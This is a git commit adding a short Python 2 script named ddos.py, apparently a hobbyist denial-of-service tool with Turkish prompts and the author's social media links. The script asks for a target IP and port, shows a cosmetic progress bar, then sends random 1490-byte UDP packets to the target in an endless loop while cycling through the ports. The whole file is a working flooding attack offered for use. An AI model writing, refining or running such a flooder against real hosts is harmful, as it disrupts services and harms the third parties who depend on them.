c866b66ed1a52297f3acdb28f4e8e34a9348368e
kryptonxls <83668701+kryptonxls@users.noreply.github.com>
2021-05-25 13:26:50 +0000

    Add files via upload

---
+++ ddos.py
@@ -0,0 +1,54 @@
+
+#!/usr/bin/env python
+#-*- coding: utf-8 -*-
+
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet Ddos Machine")
+print
+print ("Yapimci: Krypton.xls")
+print "Youtube: https://www.youtube.com/channel/UCKC9iRfyVgdQt0oFm_QOyQg"
+print "github: https://github.com/kryptonxls"
+print "Instagram: krypton.xls"
+print
+ip = raw_input("Hedef IP : ")
+port = input("Port       : ")
+
+os.system("clear")
+os.system("figlet Saldiri  Basliyor")
+print "[                    ] 0% "
+time.sleep(5)
+print "[=====               ] 25%"
+time.sleep(5)
+print "[==========          ] 50%"
+time.sleep(5)
+print "[===============     ] 75%"
+time.sleep(5)
+print "[====================] 100%"
+time.sleep(3)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
